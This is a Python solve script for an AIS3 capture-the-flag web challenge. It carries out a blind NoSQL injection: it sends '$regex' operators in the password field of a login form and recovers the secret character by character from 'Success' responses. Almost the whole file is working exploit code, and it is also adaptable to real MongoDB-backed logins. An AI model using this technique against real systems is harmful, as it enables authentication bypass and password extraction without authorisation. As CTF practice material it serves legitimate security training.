import readline
import time
import string
import requests as rq

url = 'http://chals1.ais3.org:54088/login'
#url = 'http://127.0.0.1:54088/login'


def req(user, password):
    data = {'username': user, 'password': password}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = rq.post(url, data=data, headers=headers)
    print(res.text)
    return res.text


def naive_req(data):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = rq.post(url, data=data, headers=headers)
    # print(res.text)
    return res.text


# brute force flag
flag = 'AIS3{Bl1nd-b4s3d'
flag = 'AIS3{Bl1nd-b4s3d.r3gex.n0sq1i'
flag = 'AIS3{Bl1nd-b4s3d r3gex n0sq1i\?! ..3.___.}'
flag = 'AIS3{Bl1nd-b4s3d r3gex n0sq1i\?! \(\:3\[___\]}'
# while '}' not in flag:
res = naive_req(f'username=admin&password[$regex]=^{flag}')
print(flag)
print(res)
for k in flag:
    if k != '.':
        continue
    # for c in string.ascii_letters + string.digits + '{}_!@-?.':
    for c in [x for x in range(0x20, 65)] + [x for x in range(91, 97)] + [x for x in range(123, 127)]:
        try:
            time.sleep(1)
            #c = c if c != '?' else '\\?'
            #c = '\\' + c
            c = chr(c)
            c = '\\' + c
            tmp = flag[:flag.index(k)] + c + flag[flag.index(k)+1:]
            # print(tmp)
            data = f'username=admin&password[$regex]=^{tmp}.*'
            res = naive_req(data)
            if 'Success' in res:
                flag = tmp
                print('Flag:', flag)
                break
        except KeyboardInterrupt:
            print('Flag:', flag)
            exit(0)
        except ConnectionError:
            pass
            time.sleep(5)
            res = naive_req(data)
            if 'Success' in res:
                flag = tmp
                print('Flag:', flag)
                break
        except Exception as e:
            print(e)
            print(f'Error char: {c}')
